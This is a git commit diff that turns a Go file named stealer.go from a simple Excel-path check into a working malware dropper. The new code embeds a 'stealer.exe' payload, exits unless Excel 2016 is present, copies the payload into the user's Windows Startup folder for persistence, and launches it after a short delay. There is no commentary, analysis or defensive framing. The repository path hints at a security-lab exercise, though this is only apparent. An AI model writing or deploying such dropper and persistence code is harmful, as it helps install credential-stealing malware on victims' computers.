17d4aa3c6d64c6124b686da57b1ddcc8de919972
mylovemyon <102661460+mylovemyon@users.noreply.github.com>
2025-12-02 23:37:14 +0900

    Update stealer.go

--- Sherlocks/stealer.go
+++ Sherlocks/stealer.go
@@ -1,25 +1,56 @@
 package main
 
 import (
-	"fmt"
+	"embed"
 	"os"
+	"os/exec"
+	"path/filepath"
+	"time"
 )
 
-func main() {
-	path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
-	info, err := os.Stat(path)
-	if os.IsNotExist(err) {
-		fmt.Println(err)
-		return
+//go:embed stealer.exe
+var embeddedFiles embed.FS
+
+func check() {
+	// check installed execl2016
+	excel_path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
+	if _, err := os.Stat(excel_path); os.IsNotExist(err) {
+		os.Exit(1)
 	}
+}
+
+func hidden() []byte {
+	// embed stealer.exe into dropper.exe
+	data, err := embeddedFiles.ReadFile("stealer.exe")
 	if err != nil {
-		fmt.Println(err)
+		return nil
 	}
-	if info.IsDir() {
-		fmt.Println("test")
-	} else {
-		fmt.Println("sucess")
+	return data
+}
+
+func drop(data []byte) string {
+	// output stealer.exe to startup folder
+	appdata := os.Getenv("APPDATA")
+	startup := filepath.Join(appdata, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.exe")
+
+	err := os.WriteFile(startup, data, 0755)
+	if err != nil {
+		return ""
 	}
+	return startup
+}
+
+func main() {
+	check()
+
+	data := hidden()
+
+	path := drop(data)
+
+	// exec stealer.exe
+	time.Sleep(5 * time.Second)
+	cmd := exec.Command(path)
+	cmd.Start()
 }
 
 
